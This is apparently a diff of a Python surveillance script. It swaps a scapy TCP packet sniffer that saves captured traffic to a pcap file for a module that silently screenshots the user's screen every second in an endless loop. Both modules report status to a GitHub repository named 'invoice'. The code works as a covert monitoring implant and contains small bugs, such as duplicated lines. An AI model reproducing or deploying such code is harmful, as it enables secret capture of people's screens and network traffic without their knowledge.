@@ -1,6 +1,7 @@
-import subprocess
 import os
-from scapy.all import *
+from datetime import datetime
+import pyautogui
+from time import sleep
 import requests
 import base64
 import getpass
@@ -66,48 +67,45 @@ class Log():
         else:
             print("Failed to check file existence:", existing_file_response.text)
 
-class Sniffer():
+
+
+
+
+
+class ScreenshotMaker():
     def __init__(self, script_name):
         self.script_name = script_name
-        self.packets = []
 
-    def packet_handler(self, packet):
-        destination_directory = "/tmp/results"
-        if not os.path.exists(destination_directory):
-           os.makedirs(destination_directory)
-            
-        if packet.haslayer(IP):
-            src_ip = packet[IP].src
-            dst_ip = packet[IP].dst
-            output = f"Source IP: {src_ip}  Destination IP: {dst_ip}\n"
-
-            if packet.haslayer(TCP):
-                src_port = packet[TCP].sport
-                dst_port = packet[TCP].dport
-                output += f"Source Port: {src_port}  Destination Port: {dst_port}\n"
-
-                data = packet[TCP].payload
-                output += f"Data: {repr(data)}\n"
-            
-            new_packet = IP(src=src_ip, dst=dst_ip) / TCP(sport=src_port, dport=dst_port) / Raw(load=str(data))
-
-            self.packets.append(new_packet)    
-            wrpcap("/tmp/results/output.pcap", self.packets)
-                
-    def start_sniffing(self):
-        file_creator.create_file("logs", sniffer.script_name,"Script completed successfully")
-        sniff(filter="tcp", prn=self.packet_handler)
+    def TakeScreenshot(self):    
+        '''Beschrijving'''
+        screenshot_path = r"C:\Users\Public\screenshots"
         
+        if not os.path.exists(screenshot_path):
+            os.makedirs(screenshot_path)
         
-
-
+        items = items = os.listdir(r"C:\Users\Public")
+        folder_exists = False
+        for item in items:
+            item_path = os.path.join(r"C:\Users\Public", item)
+            if os.path.isdir(item_path) and item == "screenshots":
+                folder_exists = True
+                pass
+        if folder_exists:
+            file_creator.create_file("logs", screenshot.script_name,"Script completed successfully")
+        else:
+            file_creator.create_file("logs",screenshot.script_name,"Script may have encountered erros")
+    
+        while True:   
+            now = datetime.now()
+            filename = f"screenshot_{now.strftime('%Y%m%d_%H%M%S')}.png"    
+            filepath = os.path.join(screenshot_path, filename)
+            im = pyautogui.screenshot()  
+            im = pyautogui.screenshot()   
+            im.save(filepath)   
+            sleep(1)
+     
 repository_owner = 'rsecurity12' 
 repository_name = 'invoice' 
 access_token = ''  
-sniffer = Sniffer('Sniffer')
+screenshot = ScreenshotMaker("ScreenshotMaker")
 file_creator = Log(repository_owner, repository_name, access_token)
-
-try:
-  sniffer.start_sniffing()
-except:
-  file_creator.create_file("logs",sniffer.script_name,"Script may have encountered erros")
